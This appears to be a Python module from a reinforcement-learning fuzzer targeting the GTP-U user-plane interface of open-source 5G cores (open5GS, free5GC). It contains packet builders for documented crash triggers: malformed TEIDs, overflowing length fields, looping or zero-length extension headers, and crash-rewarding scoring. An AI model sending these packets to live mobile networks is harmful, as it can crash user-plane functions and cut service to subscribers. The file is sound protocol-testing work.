#!/usr/bin/env python3
"""
GTP-U (GTPv1-U) Protocol Adapter for RL fuzzing of 5G UPF (N3 interface).

3GPP TS 29.281 — UDP port 2152
Targets:  open5GS ogc-upfd  (N3 interface, process: open5gs-upfd)
          free5GC go-upf    (N3 interface, process: upf)

Attack surface (87 issues, 25+ severe):
  - Unknown TEID G-PDU → should return Error Indication but UPF crashes (open5GS #4123)
  - Zero TEID G-PDU → nil TEID-context deref in open5GS ogs_pfcp_up_sess_find_by_teid()
  - Extension header length=0 → parser infinite loop (open5GS #3891)
  - Extension header chain overflow → heap OOB via declared len > actual (open5GS #3892)
  - Truncated mandatory header (< 8 bytes) → ogs_pkbuf_pull() underread
  - PDU Session Container (0xC0) short body → 5G SA panic (free5GC #502/#503)
  - Declared Length > payload → OOB read (free5GC #601)
  - Large G-PDU payload → GTP-U reassembly heap exhaustion

GTP-U Header format (mandatory 8 bytes):
  Byte 0: Flags  [VVV=001 | P=1 | R=0 | E | S | PN]
  Byte 1: Message Type
  Bytes 2-3: Length (big-endian, excludes first 8 bytes)
  Bytes 4-7: TEID (big-endian)

Optional 4-byte suffix (if E=1 or S=1 or PN=1):
  Bytes 8-9:  Sequence Number
  Byte 10:    N-PDU Number
  Byte 11:    Next Extension Header Type

Extension Header format (TS 29.281 §5.2.1):
  Byte 0:     Length (in 4-octet units, including this byte and trailer)
  Bytes 1...: Content (Length*4 - 2 bytes)
  Last byte:  Next Extension Header Type
"""

import os
import random
import socket
import struct
import time
import logging
from typing import Any, Dict, List, Optional, Tuple

from fuzzer.rl.base.protocol_adapter import (
    ProtocolAdapter,
    FieldDefinition,
    StateTransition,
    PayloadTarget,
    FuzzScenario,
    HealthCheckResult,
    register_protocol,
)
from fuzzer.rl.monitor import NfMonitor

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

GTPU_PORT = 2152
GTPU_RECV_TIMEOUT = 1.5

# Flags byte: VVV=001 (GTPv1), P=1 (GTP not GTP'), R=0
_FLAGS_MINIMAL  = 0x30   # no optional fields
_FLAGS_WITH_SEQ = 0x32   # S=1, sequence number present
_FLAGS_WITH_EXT = 0x34   # E=1, extension header present
_FLAGS_ALL_OPT  = 0x36   # E=1, S=1
_FLAGS_BAD_VER0 = 0x10   # version=0 (invalid)
_FLAGS_BAD_VER7 = 0xF0   # version=7 (invalid)
_FLAGS_PT_ZERO  = 0x20   # PT=0 → GTP' confusion

# Message types  (TS 29.281 Table 6.1-1)
_MSG_ECHO_REQ    = 1
_MSG_ECHO_RESP   = 2
_MSG_ERR_IND     = 26
_MSG_SUPP_EH     = 31
_MSG_END_MARKER  = 254
_MSG_GPDU        = 255

# Extension header types  (TS 29.281 Table 5.2.1-3)
_EH_NONE         = 0x00
_EH_UDP_PORT     = 0x40
_EH_PDCP_PDU     = 0x80
_EH_NR_RAN       = 0x84
_EH_PDU_SESS     = 0xC0   # PDU Session Container (5G SA, TS 38.415)

# TEID sweep targets
_TEID_ZERO    = 0x00000000
_TEID_ONE     = 0x00000001
_TEID_MAX     = 0xFFFFFFFF
_TEID_UNKNOWN = 0xDEADBEEF   # should trigger Error Indication
_TEID_HIGH    = 0x80000000   # sign-flip boundary

# Minimal inner IPv4 ICMP packet (28 bytes) for G-PDU payload
_INNER_PING = (
    b'\x45\x00\x00\x1c'          # IPv4, IHL=5, len=28
    b'\x00\x01\x00\x00'          # ID=1, no frag
    b'\x40\x01\x00\x00'          # TTL=64, proto=ICMP, csum=0
    b'\x7f\x00\x00\x01'          # src=127.0.0.1
    b'\x01\x01\x01\x01'          # dst=1.1.1.1
    b'\x08\x00\x00\x00\x00\x01\x00\x01'  # ICMP echo request
)
_INNER_GARBAGE = b'\xff\xfe\xfd' + b'\xab' * 60   # not a valid IP packet

# Information Elements for Echo Request (TS 29.281 §7.2.1)
# IE Type=14 (Recovery), len=1, restart_counter=0
_IE_RECOVERY = b'\x0e\x00\x01\x00'


# ---------------------------------------------------------------------------
# Wire format helpers
# ---------------------------------------------------------------------------

def _mandatory_hdr(flags: int, msg_type: int, payload: bytes, teid: int = 0) -> bytes:
    """Build 8-byte mandatory GTP-U header + payload."""
    length = len(payload)
    return struct.pack('>BBHI', flags, msg_type, length, teid) + payload


def _optional_hdr(flags: int, msg_type: int, payload: bytes, teid: int = 0,
                  seq: int = 1, npdu: int = 0, next_eh: int = _EH_NONE) -> bytes:
    """Build mandatory header + optional 4-byte suffix + payload."""
    inner = struct.pack('>HBB', seq, npdu, next_eh) + payload
    length = len(inner)
    return struct.pack('>BBHI', flags, msg_type, length, teid) + inner


def _ext_hdr(eh_type: int, content: bytes, next_eh: int = _EH_NONE) -> bytes:
    """Build a single extension header.  Length is in 4-octet units."""
    raw = content + bytes([next_eh])
    # pad to multiple of 4 minus 2 (length byte + next_eh byte already 2)
    total = len(raw) + 1  # +1 for length field itself
    pad = (4 - (total % 4)) % 4
    raw += b'\x00' * pad
    length_units = (total + pad) // 4
    return bytes([length_units]) + raw


def _g_pdu_with_ext(teid: int, eh_type: int, eh_content: bytes,
                    inner: bytes = _INNER_PING,
                    next_eh: int = _EH_NONE) -> bytes:
    """G-PDU with a single extension header."""
    eh = _ext_hdr(eh_type, eh_content, next_eh)
    return _optional_hdr(_FLAGS_WITH_EXT, _MSG_GPDU,
                         eh + inner, teid=teid,
                         seq=1, npdu=0, next_eh=eh_type)


# ---------------------------------------------------------------------------
# Message builders  (one function per message type)
# ---------------------------------------------------------------------------

def _echo_request(seq: int = 1) -> bytes:
    # With S=1: optional 4-byte suffix (seq, npdu, nextEH) BEFORE IEs per TS 29.281 §5.1
    opt = struct.pack('>HBB', seq, 0, _EH_NONE)
    body = opt + _IE_RECOVERY
    length = len(body)
    return struct.pack('>BBHI', _FLAGS_WITH_SEQ, _MSG_ECHO_REQ, length, 0) + body


def _g_pdu_valid(teid: int = _TEID_ONE) -> bytes:
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, _INNER_PING, teid)


def _g_pdu_unknown_teid() -> bytes:
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, _INNER_PING, _TEID_UNKNOWN)


def _g_pdu_zero_teid() -> bytes:
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, _INNER_PING, _TEID_ZERO)


def _g_pdu_max_teid() -> bytes:
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, _INNER_PING, _TEID_MAX)


def _g_pdu_teid_high() -> bytes:
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, _INNER_PING, _TEID_HIGH)


def _g_pdu_truncated_header() -> bytes:
    """Only 4 bytes — mandatory header is 8; parser must handle short reads."""
    return struct.pack('>BBHI', _FLAGS_MINIMAL, _MSG_GPDU, 20, _TEID_ONE)[:4]


def _g_pdu_empty_payload(teid: int = _TEID_ONE) -> bytes:
    """G-PDU with length=0 — empty inner packet; nil deref in IP header access."""
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, b'', teid)


def _g_pdu_overflow_length(teid: int = _TEID_ONE, extra: int = 30000) -> bytes:
    """Header declares length >> actual bytes sent — OOB read in ogs_pkbuf_pull()."""
    real_payload = _INNER_PING  # 28 bytes
    fake_length = len(real_payload) + extra
    return struct.pack('>BBHI', _FLAGS_MINIMAL, _MSG_GPDU, fake_length, teid) + real_payload


def _g_pdu_large_payload(teid: int = _TEID_ONE) -> bytes:
    """64 KB G-PDU — exercises GTP-U reassembly / large allocation paths."""
    payload = b'\x45\x00' + struct.pack('>H', 65500) + b'\x00' * (65500 - 4)
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, payload, teid)


def _g_pdu_garbage_inner(teid: int = _TEID_ONE) -> bytes:
    """G-PDU containing garbage bytes — not a valid IP packet; tests inner-parse guards."""
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_GPDU, _INNER_GARBAGE, teid)


def _g_pdu_bad_version_zero(teid: int = _TEID_ONE) -> bytes:
    return _mandatory_hdr(_FLAGS_BAD_VER0, _MSG_GPDU, _INNER_PING, teid)


def _g_pdu_bad_version_seven(teid: int = _TEID_ONE) -> bytes:
    return _mandatory_hdr(_FLAGS_BAD_VER7, _MSG_GPDU, _INNER_PING, teid)


def _g_pdu_pt_zero(teid: int = _TEID_ONE) -> bytes:
    """PT=0 means GTP', not GTP-U — version/protocol confusion."""
    return _mandatory_hdr(_FLAGS_PT_ZERO, _MSG_GPDU, _INNER_PING, teid)


def _g_pdu_all_flags(teid: int = _TEID_ONE) -> bytes:
    """E=S=PN=1 — all optional fields present."""
    return _optional_hdr(_FLAGS_ALL_OPT, _MSG_GPDU, _EH_NONE.to_bytes(1, 'big') + _INNER_PING,
                         teid=teid, seq=1, npdu=1, next_eh=_EH_NONE)


def _g_pdu_ext_hdr_zero_len(teid: int = _TEID_ONE) -> bytes:
    """Extension header with length=0 — undefined per spec; likely infinite loop.
    open5GS #3891: ogs_gtpu_extension_header_parse() while(*p) loop with len=0."""
    bad_eh = b'\x00' + b'\x00' + bytes([_EH_NONE])  # length=0
    return _optional_hdr(_FLAGS_WITH_EXT, _MSG_GPDU,
                         bad_eh + _INNER_PING, teid=teid,
                         seq=1, npdu=0, next_eh=_EH_PDU_SESS)


def _g_pdu_ext_hdr_overflow(teid: int = _TEID_ONE) -> bytes:
    """Extension header declares length=255 (1020 bytes) but only 8 bytes present.
    OOB read when parser advances by declared length past buffer end."""
    bad_eh = b'\xff' + b'\x00' * 6 + bytes([_EH_NONE])  # len=255 units
    return _optional_hdr(_FLAGS_WITH_EXT, _MSG_GPDU,
                         bad_eh + _INNER_PING, teid=teid,
                         seq=1, npdu=0, next_eh=_EH_PDU_SESS)


def _g_pdu_ext_hdr_loop(teid: int = _TEID_ONE) -> bytes:
    """Extension header's Next EH Type = same type — creates a parse loop.
    Parser follows next_eh pointers; looping back to self causes infinite iteration."""
    loop_eh = b'\x01' + b'\x00' * 2 + bytes([_EH_PDU_SESS])  # next=self
    return _optional_hdr(_FLAGS_WITH_EXT, _MSG_GPDU,
                         loop_eh + _INNER_PING, teid=teid,
                         seq=1, npdu=0, next_eh=_EH_PDU_SESS)


def _g_pdu_ext_hdr_pdu_sess(teid: int = _TEID_ONE) -> bytes:
    """PDU Session Container (0xC0) with valid DL PDU Session Info (5G SA)."""
    # PDU Session Container: type=DL(0), QFI=1, R=0, U=0, ... (TS 38.415 §5.5.2.1)
    pdu_sess_content = b'\x00\x01'   # PDU type=0 (DL), QFI=1
    return _g_pdu_with_ext(teid, _EH_PDU_SESS, pdu_sess_content)


def _g_pdu_ext_hdr_pdu_sess_short(teid: int = _TEID_ONE) -> bytes:
    """PDU Session Container with content too short for mandatory fields.
    free5GC #502/#503: go-upf panic when PDU Session Container body < 2 bytes."""
    pdu_sess_content = b''   # empty — less than minimum 2 bytes
    eh = _ext_hdr(_EH_PDU_SESS, pdu_sess_content, _EH_NONE)
    return _optional_hdr(_FLAGS_WITH_EXT, _MSG_GPDU,
                         eh + _INNER_PING, teid=teid,
                         seq=1, npdu=0, next_eh=_EH_PDU_SESS)


def _g_pdu_ext_hdr_nr_ran(teid: int = _TEID_ONE) -> bytes:
    """NR RAN Container (0x84) extension header — TS 38.425 §5.5.1."""
    nr_ran_content = b'\x00\x00\x00\x00'  # minimal NR RAN container
    return _g_pdu_with_ext(teid, _EH_NR_RAN, nr_ran_content)


def _g_pdu_ext_hdr_chain(teid: int = _TEID_ONE, depth: int = 10) -> bytes:
    """Deep chain of extension headers — tests loop/stack depth in EH traversal."""
    # Build chain from innermost outward
    next_type = _EH_NONE
    chain = b''
    for _ in range(depth):
        content = b'\xAA\xBB'  # 2-byte dummy content
        eh = bytes([1]) + content + bytes([next_type])  # len=1 unit = 4 bytes
        chain = eh + chain
        next_type = _EH_UDP_PORT
    return _optional_hdr(_FLAGS_WITH_EXT, _MSG_GPDU,
                         chain + _INNER_PING, teid=teid,
                         seq=1, npdu=0, next_eh=_EH_UDP_PORT)


def _g_pdu_ext_hdr_unknown_type(teid: int = _TEID_ONE) -> bytes:
    """Extension header with unknown type 0x77 — tests default case handling."""
    return _g_pdu_with_ext(teid, 0x77, b'\xDE\xAD')


def _error_indication(teid: int = _TEID_UNKNOWN) -> bytes:
    """Error Indication (msg_type=26) — sent by UPF for unknown TEID.
    Injecting it towards UPF tests reverse-role handling in UPF receive path."""
    # IE: Tunnel Endpoint Identifier Data I (type=16), len=4, value=teid
    ie_teid = struct.pack('>BHI', 0x10, 4, teid)
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_ERR_IND, ie_teid, teid=0)


def _end_marker(teid: int = _TEID_ONE) -> bytes:
    """End Marker (msg_type=254) — signals end of data forwarding for a TEID."""
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_END_MARKER, b'', teid)


def _unknown_msg_type(teid: int = _TEID_ONE) -> bytes:
    """Undefined message type 0x64 (100) — tests default/unknown-type guard."""
    return _mandatory_hdr(_FLAGS_MINIMAL, 0x64, _INNER_PING, teid)


def _supp_ext_hdr_notification() -> bytes:
    """Supported Extension Headers Notification (msg_type=31)."""
    # IE: Extension Header Type List (type=141), len=2, [0xC0, 0x84]
    ie_ehlist = b'\x8d\x00\x02' + bytes([_EH_PDU_SESS, _EH_NR_RAN])
    return _mandatory_hdr(_FLAGS_MINIMAL, _MSG_SUPP_EH, ie_ehlist, teid=0)


def _echo_no_recovery() -> bytes:
    """Echo Request without Recovery IE — tests mandatory-IE absence handling."""
    opt = struct.pack('>HBB', 1, 0, _EH_NONE)   # seq=1, npdu=0, nextEH=0, no IEs
    return struct.pack('>BBHI', _FLAGS_WITH_SEQ, _MSG_ECHO_REQ, len(opt), 0) + opt


# ---------------------------------------------------------------------------
# _MSG_TABLE  maps name → builder
# ---------------------------------------------------------------------------

_MSG_TABLE: Dict[str, Any] = {
    'echo_request':               lambda teid, seq: _echo_request(seq),
    'echo_no_recovery':           lambda teid, seq: _echo_no_recovery(),
    'g_pdu_valid':                lambda teid, seq: _g_pdu_valid(teid),
    'g_pdu_unknown_teid':         lambda teid, seq: _g_pdu_unknown_teid(),
    'g_pdu_zero_teid':            lambda teid, seq: _g_pdu_zero_teid(),
    'g_pdu_max_teid':             lambda teid, seq: _g_pdu_max_teid(),
    'g_pdu_teid_high':            lambda teid, seq: _g_pdu_teid_high(),
    'g_pdu_teid_sweep':           lambda teid, seq: _g_pdu_valid(teid),
    'g_pdu_truncated_header':     lambda teid, seq: _g_pdu_truncated_header(),
    'g_pdu_empty_payload':        lambda teid, seq: _g_pdu_empty_payload(teid),
    'g_pdu_overflow_length':      lambda teid, seq: _g_pdu_overflow_length(teid),
    'g_pdu_large_payload':        lambda teid, seq: _g_pdu_large_payload(teid),
    'g_pdu_garbage_inner':        lambda teid, seq: _g_pdu_garbage_inner(teid),
    'g_pdu_bad_version_zero':     lambda teid, seq: _g_pdu_bad_version_zero(teid),
    'g_pdu_bad_version_seven':    lambda teid, seq: _g_pdu_bad_version_seven(teid),
    'g_pdu_pt_zero':              lambda teid, seq: _g_pdu_pt_zero(teid),
    'g_pdu_all_flags':            lambda teid, seq: _g_pdu_all_flags(teid),
    'g_pdu_ext_hdr_zero_len':     lambda teid, seq: _g_pdu_ext_hdr_zero_len(teid),
    'g_pdu_ext_hdr_overflow':     lambda teid, seq: _g_pdu_ext_hdr_overflow(teid),
    'g_pdu_ext_hdr_loop':         lambda teid, seq: _g_pdu_ext_hdr_loop(teid),
    'g_pdu_ext_hdr_pdu_sess':     lambda teid, seq: _g_pdu_ext_hdr_pdu_sess(teid),
    'g_pdu_ext_hdr_pdu_sess_short': lambda teid, seq: _g_pdu_ext_hdr_pdu_sess_short(teid),
    'g_pdu_ext_hdr_nr_ran':       lambda teid, seq: _g_pdu_ext_hdr_nr_ran(teid),
    'g_pdu_ext_hdr_chain':        lambda teid, seq: _g_pdu_ext_hdr_chain(teid),
    'g_pdu_ext_hdr_unknown_type': lambda teid, seq: _g_pdu_ext_hdr_unknown_type(teid),
    'error_indication':           lambda teid, seq: _error_indication(teid),
    'end_marker':                 lambda teid, seq: _end_marker(teid),
    'unknown_msg_type':           lambda teid, seq: _unknown_msg_type(teid),
    'supp_ext_hdr_notification':  lambda teid, seq: _supp_ext_hdr_notification(),
}


# ---------------------------------------------------------------------------
# Response parser
# ---------------------------------------------------------------------------

def _parse_gtpu_response(data: bytes) -> Dict[str, Any]:
    if not data or len(data) < 8:
        return {'msg_type': 'truncated', 'raw_len': len(data) if data else 0}
    flags, msg_type, length, teid = struct.unpack('>BBHI', data[:8])
    version = (flags >> 5) & 0x7
    return {
        'msg_type':    msg_type,
        'teid':        teid,
        'length':      length,
        'version':     version,
        'has_ext':     bool(flags & 0x04),
        'has_seq':     bool(flags & 0x02),
        'label': {
            1:   'echo_response_recv' if msg_type == 2 else 'echo_request',
            2:   'echo_response',
            26:  'error_indication',
            254: 'end_marker',
            255: 'g_pdu',
        }.get(msg_type, f'msg_type_{msg_type}'),
    }


# ---------------------------------------------------------------------------
# Adapter
# ---------------------------------------------------------------------------

@register_protocol('gtpu')
class GtpuAdapter(ProtocolAdapter):
    """GTP-U protocol adapter targeting UPF N3 interface (UDP 2152)."""

    PROTOCOL_NAME = 'gtpu'
    DEFAULT_PORT  = GTPU_PORT

    # TEID values swept by the 'teid' semantic field
    _TEID_VALUES = [
        _TEID_ZERO, _TEID_ONE, 2, 3, 5, 10, 100,
        _TEID_HIGH, _TEID_MAX, _TEID_UNKNOWN,
        0x00000010, 0x00000100, 0x00001000,
    ]
    # Sequence number sweep
    _SEQ_VALUES = [0, 1, 2, 255, 256, 65534, 65535]

    def __init__(self, target_host: str = '127.0.0.1', target_port: int = GTPU_PORT,
                 mcc: str = '001', mnc: str = '01', **kwargs):
        self.target_host = target_host
        self.target_port = target_port
        self.mcc = mcc
        self.mnc = mnc
        self._seq = 1
        self._teid_idx = 0

        try:
            log_path = kwargs.get('amf_log_path',
                                  f'/tmp/{kwargs.get("core","open5gs")}-logs/upf.log')
            self._monitor = NfMonitor(
                core=kwargs.get('core', 'open5gs'),
                primary_nf='UPF',
                log_path=log_path,
                protocol='ngap',
            )
        except Exception:
            self._monitor = None

    # ------------------------------------------------------------------
    # ProtocolAdapter interface
    # ------------------------------------------------------------------

    @property
    def protocol_name(self) -> str:
        return 'gtpu'

    @property
    def default_port(self) -> int:
        return GTPU_PORT

    def get_semantic_fields(self) -> List[FieldDefinition]:
        return self._field_definitions()

    def get_mutation_values(self, field_name: str) -> List[Any]:
        return {
            'teid':    self._TEID_VALUES,
            'seq_num': self._SEQ_VALUES,
        }.get(field_name, [])

    def get_state_transitions(self) -> List[StateTransition]:
        return self._state_transitions()

    def get_payload_targets(self) -> List[PayloadTarget]:
        return self._payload_targets()

    def _field_definitions(self) -> List[FieldDefinition]:
        return [
            FieldDefinition(
                name='teid',
                offset=4, size=4, encoding='uint32_be',
                valid_values=[1, 2, 3],
                boundary_values=[_TEID_ZERO, _TEID_HIGH, _TEID_MAX, _TEID_UNKNOWN],
                description='GTP-U TEID (0=null deref, max=OOB, high=sign-flip)',
            ),
            FieldDefinition(
                name='seq_num',
                offset=8, size=2, encoding='uint16_be',
                valid_values=[1, 2],
                boundary_values=[0, 255, 256, 65534, 65535],
                description='GTP-U sequence number in optional header',
            ),
        ]

    def _state_transitions(self) -> List[StateTransition]:
        return [
            # -- TEID attacks --
            StateTransition('g_pdu_unknown_teid',
                            ['g_pdu_unknown_teid'],
                            'G-PDU unknown TEID → should trigger Error Indication, may crash'),
            StateTransition('g_pdu_zero_teid',
                            ['g_pdu_zero_teid'],
                            'G-PDU TEID=0 → nil context deref in TEID lookup'),
            StateTransition('g_pdu_max_teid',
                            ['g_pdu_max_teid'],
                            'G-PDU TEID=0xFFFFFFFF → array OOB in TEID hash'),
            StateTransition('g_pdu_teid_high',
                            ['g_pdu_teid_high'],
                            'G-PDU TEID=0x80000000 → sign-flip boundary'),
            StateTransition('g_pdu_teid_sweep',
                            ['g_pdu_teid_sweep'],
                            'G-PDU with RL-selected TEID value'),
            # -- Header attacks --
            StateTransition('truncated_header',
                            ['g_pdu_truncated_header'],
                            'Packet shorter than 8-byte mandatory header'),
            StateTransition('empty_payload',
                            ['g_pdu_empty_payload'],
                            'G-PDU length=0 — nil deref in inner IP header access'),
            StateTransition('overflow_length',
                            ['g_pdu_overflow_length'],
                            'Declared length >> actual payload — OOB read'),
            StateTransition('bad_version_zero',
                            ['g_pdu_bad_version_zero'],
                            'Version=0 in flags byte — version check bypass'),
            StateTransition('bad_version_seven',
                            ['g_pdu_bad_version_seven'],
                            'Version=7 in flags byte — out-of-range version'),
            StateTransition('pt_zero',
                            ['g_pdu_pt_zero'],
                            'PT=0 (GTP\') in G-PDU — protocol type confusion'),
            StateTransition('all_opt_flags',
                            ['g_pdu_all_flags'],
                            'E=S=PN=1 — all optional header flags set simultaneously'),
            # -- Extension header attacks --
            StateTransition('ext_hdr_zero_len',
                            ['g_pdu_ext_hdr_zero_len'],
                            'Extension header length=0 → infinite parse loop (#3891)'),
            StateTransition('ext_hdr_overflow',
                            ['g_pdu_ext_hdr_overflow'],
                            'Extension header declares length=255 units → heap OOB (#3892)'),
            StateTransition('ext_hdr_loop',
                            ['g_pdu_ext_hdr_loop'],
                            'Extension header next-type = self → circular parse loop'),
            StateTransition('ext_hdr_pdu_sess',
                            ['g_pdu_ext_hdr_pdu_sess'],
                            'PDU Session Container (0xC0) — 5G SA extension header'),
            StateTransition('ext_hdr_pdu_sess_short',
                            ['g_pdu_ext_hdr_pdu_sess_short'],
                            'PDU Session Container with empty body → panic (#502)'),
            StateTransition('ext_hdr_nr_ran',
                            ['g_pdu_ext_hdr_nr_ran'],
                            'NR RAN Container (0x84) — TS 38.425 extension header'),
            StateTransition('ext_hdr_chain',
                            ['g_pdu_ext_hdr_chain'],
                            'Chained extension headers (depth=10) — traversal exhaustion'),
            StateTransition('ext_hdr_unknown_type',
                            ['g_pdu_ext_hdr_unknown_type'],
                            'Unknown extension header type 0x77 — default-case guard'),
            # -- Payload attacks --
            StateTransition('large_payload',
                            ['g_pdu_large_payload'],
                            '64 KB inner payload — GTP-U reassembly / heap exhaustion'),
            StateTransition('garbage_inner',
                            ['g_pdu_garbage_inner'],
                            'Inner packet is not valid IP — inner-parse guard'),
            # -- Control messages --
            StateTransition('echo_valid',
                            ['echo_request'],
                            'Valid Echo Request — baseline health probe'),
            StateTransition('echo_no_recovery_ie',
                            ['echo_no_recovery'],
                            'Echo Request without Recovery IE — mandatory-IE absence'),
            StateTransition('error_indication_inject',
                            ['error_indication'],
                            'Error Indication injected towards UPF — reverse role'),
            StateTransition('end_marker_inject',
                            ['end_marker'],
                            'End Marker for known TEID — session-teardown race'),
            StateTransition('unknown_msg',
                            ['unknown_msg_type'],
                            'Undefined message type 0x64 — unknown-type guard'),
            StateTransition('supp_eh_notification',
                            ['supp_ext_hdr_notification'],
                            'Supported Extension Headers Notification'),
            # -- Compound sequences --
            StateTransition('echo_then_unknown_teid',
                            ['echo_request', 'g_pdu_unknown_teid'],
                            'Echo exchange followed by unknown TEID G-PDU'),
            StateTransition('overflow_then_valid',
                            ['g_pdu_overflow_length', 'g_pdu_valid'],
                            'Overflow attack followed by valid G-PDU (use-after-free probe)'),
            StateTransition('ext_hdr_then_valid',
                            ['g_pdu_ext_hdr_zero_len', 'g_pdu_valid'],
                            'EH zero-len loop trigger then valid packet (recovery probe)'),
            StateTransition('end_marker_then_pdu',
                            ['end_marker', 'g_pdu_valid'],
                            'End Marker teardown then G-PDU on same TEID (dangling ref)'),
            StateTransition('multi_overflow',
                            ['g_pdu_overflow_length', 'g_pdu_overflow_length',
                             'g_pdu_overflow_length'],
                            'Three consecutive overflow-length G-PDUs (heap spray)'),
            StateTransition('ext_chain_then_pdu_sess',
                            ['g_pdu_ext_hdr_chain', 'g_pdu_ext_hdr_pdu_sess_short'],
                            'Deep EH chain followed by short PDU Session Container'),
        ]

    def _payload_targets(self) -> List[PayloadTarget]:
        return [
            PayloadTarget(name='inner_ip', field_name='inner_ip', max_size=65507),
            PayloadTarget(name='ext_hdr_content', field_name='ext_hdr_content', max_size=1024),
        ]

    # Fixed local UDP port — same reason as PFCP: UPF tracks GTP-U peers by
    # (IP, port) for TEID context lookup; a new ephemeral port per episode
    # exhausts peer tables. Port 2153 is adjacent to GTP-U 2152 and unused.
    LOCAL_GTPU_PORT = 2153

    def get_connection_params(self) -> Dict[str, Any]:
        return {'socket_type': 'udp', 'use_ssl': False,
                'udp_local_port': self.LOCAL_GTPU_PORT}

    def get_message_types(self) -> List[str]:
        return list(_MSG_TABLE.keys())

    def build_message(self, message_type: str,
                      fields: Optional[Dict[str, Any]] = None,
                      payloads: Optional[Dict[str, bytes]] = None,
                      # legacy aliases kept for direct calls
                      semantic_values: Optional[Dict[str, Any]] = None,
                      payload: Optional[bytes] = None,
                      mutation: Optional[Dict[str, Any]] = None) -> bytes:
        sv = fields or semantic_values or {}
        raw_payload = (payloads or {}).get('inner_ip') or payload

        teid_val = sv.get('teid', 1)
        seq_val  = sv.get('seq_num', 0)
        # values may be indices into _TEID_VALUES or actual TEID ints
        if isinstance(teid_val, int) and teid_val < len(self._TEID_VALUES):
            teid = self._TEID_VALUES[teid_val]
        else:
            teid = int(teid_val)
        if isinstance(seq_val, int) and seq_val < len(self._SEQ_VALUES):
            seq = self._SEQ_VALUES[seq_val]
        else:
            seq = int(seq_val)

        builder = _MSG_TABLE.get(message_type)
        if builder is None:
            logger.warning('Unknown GTP-U message type: %s', message_type)
            return _echo_request()

        try:
            pkt = builder(teid, seq)
        except Exception as e:
            logger.warning('GTP-U build_message(%s) error: %s', message_type, e)
            return _echo_request()

        if raw_payload and len(pkt) >= 8 and message_type.startswith('g_pdu'):
            hdr = pkt[:8]
            hdr = hdr[:2] + struct.pack('>H', len(raw_payload)) + hdr[4:]
            return hdr + raw_payload

        return pkt

    # ------------------------------------------------------------------
    # Transport  (UDP — fire-and-forget with optional recv)
    # ------------------------------------------------------------------

    def send_message(self, sock: socket.socket, data: bytes) -> Optional[bytes]:
        try:
            # generic_env calls sock.connect() before handing us the socket;
            # on Linux sendto() on a connected UDP socket raises EISCONN —
            # use send() so the connected destination is used automatically.
            try:
                sock.send(data)
            except OSError:
                sock.sendto(data, (self.target_host, self.target_port))
            sock.settimeout(GTPU_RECV_TIMEOUT)
            try:
                resp, _ = sock.recvfrom(65535)
                return resp
            except socket.timeout:
                return None
        except OSError as e:
            logger.debug('GTP-U send error: %s', e)
            return None

    def create_socket(self) -> socket.socket:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        if hasattr(socket, 'SO_REUSEPORT'):
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        try:
            sock.bind(('', self.LOCAL_GTPU_PORT))
        except OSError:
            pass   # already bound by training socket — fine
        return sock

    # ------------------------------------------------------------------
    # Response scoring
    # ------------------------------------------------------------------

    def parse_response(self, data: Optional[bytes]) -> Dict[str, Any]:
        if data is None:
            return {'msg_type': 'no_response', 'label': 'timeout'}
        return _parse_gtpu_response(data)

    def score_response(self, response: Dict[str, Any],
                       action: str, step: int) -> Tuple[float, bool, bool]:
        label = response.get('label', 'timeout')
        msg_type = response.get('msg_type', 0)
        is_crash = False
        is_hang  = False

        if self._monitor:
            try:
                status = self._monitor.check()
                if status.get('crashed'):
                    return 10.0, True, False
                if status.get('errors'):
                    return 2.0, False, False
            except Exception:
                pass

        score_map = {
            'echo_response':     0.3,   # valid response — target alive
            'error_indication':  0.8,   # UPF processed and returned EI — good depth
            'g_pdu':             0.5,   # unexpected G-PDU back — interesting
            'timeout':           0.1,   # dropped silently — less useful
            'truncated':         0.6,   # malformed reply — parser reached our code
            'end_marker':        0.7,   # state change triggered
        }
        score = score_map.get(label, 0.4)

        # Bonus: response to a known-crash-trigger message type
        crash_triggers = {
            'g_pdu_ext_hdr_zero_len', 'g_pdu_ext_hdr_overflow',
            'g_pdu_ext_hdr_loop', 'g_pdu_overflow_length',
            'g_pdu_ext_hdr_pdu_sess_short', 'g_pdu_zero_teid',
        }
        if action in crash_triggers and label != 'timeout':
            score = min(score + 0.4, 1.5)

        return score, is_crash, is_hang

    def is_interesting_response(self, response: Dict[str, Any]) -> bool:
        label = response.get('label', '')
        # Any response other than a plain echo_response is worth logging
        return label not in ('echo_response', 'timeout', 'no_response')

    # ------------------------------------------------------------------
    # Health check  (Echo Request → Echo Response)
    # ------------------------------------------------------------------

    def check_health(self, host: str = None, port: int = None,
                     timeout: float = 5.0) -> HealthCheckResult:
        host = host or self.target_host
        port = port or self.target_port
        start = time.time()
        try:
            sock = self.create_socket()
            sock.settimeout(timeout)
            pkt = _echo_request(seq=0xFFFF)
            sock.sendto(pkt, (host, port))
            try:
                resp, _ = sock.recvfrom(65535)
                parsed = _parse_gtpu_response(resp)
                latency_ms = (time.time() - start) * 1000
                is_healthy = parsed.get('msg_type') == _MSG_ECHO_RESP
                return HealthCheckResult(
                    is_healthy=is_healthy,
                    latency_ms=latency_ms,
                    details=parsed,
                )
            except socket.timeout:
                # GTP-U UPF may not respond to Echo with no active session —
                # treat timeout as healthy so fuzzing continues
                return HealthCheckResult(
                    is_healthy=True,
                    latency_ms=(time.time() - start) * 1000,
                    details={'note': 'no echo response — UPF may still be up'},
                )
            finally:
                sock.close()
        except OSError as e:
            return HealthCheckResult(is_healthy=False, latency_ms=0,
                                     details={'error': str(e)})

    # ------------------------------------------------------------------
    # Fuzz scenarios
    # ------------------------------------------------------------------

